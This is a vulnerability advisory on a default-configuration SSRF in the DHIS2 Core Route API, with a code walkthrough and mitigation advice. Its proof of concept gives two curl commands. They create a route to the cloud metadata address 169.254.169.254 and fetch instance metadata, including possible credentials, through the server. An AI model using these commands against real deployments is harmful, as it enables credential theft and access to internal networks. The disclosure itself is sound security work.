# DHIS2 Core - Route API Default SSRF

**Submitter:** s1ain  
**Discovery Date:** 2025-11-04  
**Tested Version:** dhis2-core commit 5a9b5335e29947ecad6b9f74ef69b073f727a730  
**Impact:** Server-Side Request Forgery (Information Disclosure / Pivoting)  
**Severity:** High

## Summary
DHIS2 provides a “Route” feature that proxies arbitrary HTTP requests to pre-configured upstream services via `/api/routes/{id}/run/**`. The list of permitted upstream hosts is populated from the configuration key `route.remote_servers_allowed`. By default this key is set to `https://*`. Although the code logs a warning about wildcards, it still accepts the configuration and therefore allows any HTTPS target. Any user with `F_ROUTE_PUBLIC_ADD` can create a route to internal services (e.g., cloud metadata endpoints) and exfiltrate the response via the DHIS2 server, resulting in SSRF with potential access to internal networks and credentials.

## Vulnerability Details
1. `ConfigurationKey.ROUTE_REMOTE_SERVERS_ALLOWED` defaults to `https://*` (dhis-support/dhis-support-external/.../ConfigurationKey.java:767-774).
2. `RouteService#postConstruct` reads this value and pushes each host glob through `validateHost`, which only logs warnings but does not reject wildcards (dhis-services/dhis-service-core/.../RouteService.java:161-204). The glob is converted to a regex and stored in `allowedRouteRegexRemoteServers`.
3. `RouteService#validateRoute` and `#execute` call `isRouteUrlAllowed`, which matches the target host against the regex list. Because the default regex is `https://.*`, any HTTPS hostname passes the check.
4. The Route feature exposes CRUD endpoints to authenticated users with `F_ROUTE_PUBLIC_ADD`. After creating a route with a URL ending in `/**`, callers can hit `/api/routes/{uid}/run/<path>` to proxy arbitrary paths and query strings to the chosen upstream.

This behavior contradicts the intent of the feature—restricting outbound calls to an administrator-defined allowlist—and grants SSRF capabilities by default on fresh installations.

## Proof of Concept
1. Create a route (requires `F_ROUTE_PUBLIC_ADD`):
   ```bash
   curl -u admin:password -H 'Content-Type: application/json' \
     -d '{
           "name": "metadata",
           "url": "https://169.254.169.254/latest/meta-data/**",
           "disabled": false
         }' \
     https://dhis.example.com/api/routes
   ```
2. Use the returned UID in a request:
   ```bash
   curl -u admin:password \
     https://dhis.example.com/api/routes/<UID>/run/latest/user-data
   ```
3. The response contains AWS/Azure instance metadata pulled from the internal metadata service via the DHIS2 server.

## Impact
Attackers can coerce DHIS2 to contact arbitrary HTTPS endpoints, including internal services not otherwise reachable from the attacker’s network. This enables metadata theft (cloud credentials), port scanning, or reaching other protected systems, significantly undermining the security boundary around the DHIS2 deployment.

## Mitigation
- Change the default `route.remote_servers_allowed` value to empty or to specific trusted hosts; fail-fast when wildcards are present.
- Enhance `validateHost` to reject any host containing wildcards or pointing to private/loopback networks.
- Restrict the `F_ROUTE_PUBLIC_ADD` authority to the smallest possible administrator group and audit route usage.

## Timeline
- **2025-11-04:** Vulnerability discovered during code audit.

## Credits
Discovered by s1ain.
